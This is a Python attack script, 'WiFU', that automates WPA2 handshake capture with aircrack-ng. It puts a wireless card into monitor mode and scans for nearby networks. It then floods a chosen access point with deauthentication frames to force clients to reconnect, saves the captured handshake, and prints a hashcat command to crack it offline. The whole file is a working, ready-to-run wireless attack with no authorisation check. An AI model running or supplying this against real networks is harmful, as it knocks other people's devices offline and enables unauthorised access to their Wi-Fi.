#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import argparse
import subprocess
import datetime
import signal

# Ensure we're in the correct directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "logs")

# Create logs directory if it doesn't exist
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

def signal_handler(sig, frame):
    print('\n[!] Attack interrupted by user. Cleaning up...')
    # Reset wifi adapter to managed mode
    subprocess.run(['airmon-ng', 'stop', args.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', args.interface, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Interface reset to managed mode.")
    sys.exit(0)

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root.")
        sys.exit(1)

def check_tools():
    """Check if required tools are installed"""
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng"]
    for tool in tools:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            print(f"[!] Required tool '{tool}' is not installed.")
            print("[!] Please install aircrack-ng package.")
            sys.exit(1)

def setup_interface(interface):
    """Set up wireless interface for monitoring"""
    print(f"[*] Setting up {interface} for monitoring...")
    
    # Kill processes that might interfere with monitoring
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
    
    # Set interface to monitor mode
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    
    # Determine monitor interface name (usually interface + mon)
    mon_interface = interface
    if "mon" not in interface:
        mon_interface = f"{interface}mon"
        # Check if the mon interface exists, otherwise use the original
        result = subprocess.run(['ip', 'a', 'show', mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result.returncode != 0:
            mon_interface = interface
    
    print(f"[+] Interface {mon_interface} ready in monitor mode")
    return mon_interface

def scan_for_networks(mon_interface):
    """Scan for available networks"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_file = os.path.join(LOGS_DIR, f"scan_{timestamp}")
    
    print("[*] Scanning for nearby networks...")
    
    # Start airodump-ng in a separate process for 10 seconds
    scan_proc = subprocess.Popen(
        ['airodump-ng', '-w', scan_file, '--output-format', 'csv', mon_interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Let it run for 10 seconds
    time.sleep(10)
    scan_proc.terminate()
    scan_proc.wait()
    
    # Parse the CSV file
    csv_file = f"{scan_file}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        # Find where the client list starts
        try:
            station_index = lines.index('\r\n') if '\r\n' in lines else lines.index('\n')
            ap_lines = lines[1:station_index]
            
            for line in ap_lines:
                if ',' not in line:
                    continue
                    
                parts = [part.strip() for part in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    channel = parts[5]
                    essid = parts[13].strip()
                    
                    if essid and essid != "":
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid
                        })
        except (ValueError, IndexError) as e:
            print(f"[!] Error parsing scan results: {e}")
    else:
        print(f"[!] Scan file not found: {csv_file}")
    
    # Clean up temporary files
    for ext in ['csv', 'netxml']:
        file_path = f"{scan_file}-01.{ext}"
        if os.path.exists(file_path):
            os.remove(file_path)
    
    return networks

def capture_handshake(mon_interface, target_bssid, target_channel, target_essid):
    """Capture a WPA handshake for the target network"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(LOGS_DIR, f"wpa2_handshake_{timestamp}")
    
    print(f"[*] Targeting {target_essid} ({target_bssid}) on channel {target_channel}")
    print("[*] Starting capture... Press Ctrl+C to stop")
    
    # Start airodump focused on target network
    capture_cmd = [
        'airodump-ng',
        '-c', target_channel,
        '--bssid', target_bssid,
        '-w', output_file,
        '--output-format', 'pcap,csv',
        mon_interface
    ]
    
    capture_proc = subprocess.Popen(
        capture_cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    try:
        # Send deauthentication frames every 5 seconds
        attempts = 0
        max_attempts = 10
        
        while attempts < max_attempts:
            print(f"[*] Sending deauth packets (attempt {attempts+1}/{max_attempts})...")
            
            # Send deauth to broadcast address
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '5',
                '-a', target_bssid,
                mon_interface
            ]
            
            subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
            attempts += 1
            
            # Check if we've captured a handshake
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read().lower()
                    if "wpa handshake" in content:
                        print(f"[+] WPA handshake captured for {target_essid}!")
                        break
        
        # Clean up
        capture_proc.terminate()
        capture_proc.wait()
        
        # Check final status
        pcap_file = f"{output_file}-01.cap"
        if os.path.exists(pcap_file):
            filesize = os.path.getsize(pcap_file)
            if filesize > 0:
                print(f"[+] Handshake attempt complete. PCAP saved to: {pcap_file} ({filesize} bytes)")
                print("[+] You can crack this handshake using:")
                print(f"    hashcat -m 2500 {pcap_file} wordlist.txt")
            else:
                print("[!] Capture file is empty. Handshake may not have been captured.")
        else:
            print(f"[!] Error: Capture file not found at {pcap_file}")
            
    except KeyboardInterrupt:
        print("\n[!] Capture interrupted by user.")
    finally:
        if capture_proc.poll() is None:
            capture_proc.terminate()
            capture_proc.wait()

def main():
    check_root()
    check_tools()
    
    # Register signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)
    
    mon_interface = setup_interface(args.interface)
    
    if args.bssid and args.channel:
        capture_handshake(mon_interface, args.bssid, args.channel, args.essid or args.bssid)
    else:
        # Scan for networks and let user select one
        networks = scan_for_networks(mon_interface)
        
        if not networks:
            print("[!] No networks found. Try scanning again.")
            reset_interface(mon_interface)
            sys.exit(1)
            
        print("\nAvailable Networks:")
        print("------------------")
        for i, network in enumerate(networks):
            print(f"{i+1}. {network['essid']} (BSSID: {network['bssid']}, Channel: {network['channel']})")
            
        selection = input("\nSelect network to target (number) or 'q' to quit: ")
        if selection.lower() == 'q':
            reset_interface(mon_interface)
            sys.exit(0)
            
        try:
            index = int(selection) - 1
            if 0 <= index < len(networks):
                target = networks[index]
                capture_handshake(
                    mon_interface,
                    target['bssid'],
                    target['channel'],
                    target['essid']
                )
            else:
                print("[!] Invalid selection.")
        except ValueError:
            print("[!] Invalid input.")
    
    # Reset interface
    reset_interface(mon_interface)

def reset_interface(interface):
    """Reset the interface to managed mode"""
    print("[*] Resetting interface to managed mode...")
    subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface.replace('mon', ''), 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Interface reset complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFU: WPA2 Handshake Capture Tool")
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface to use')
    parser.add_argument('-b', '--bssid', help='Target BSSID (optional)')
    parser.add_argument('-c', '--channel', help='Target channel (optional)')
    parser.add_argument('-e', '--essid', help='Target ESSID/name (optional)')
    
    args = parser.parse_args()
    
    main()
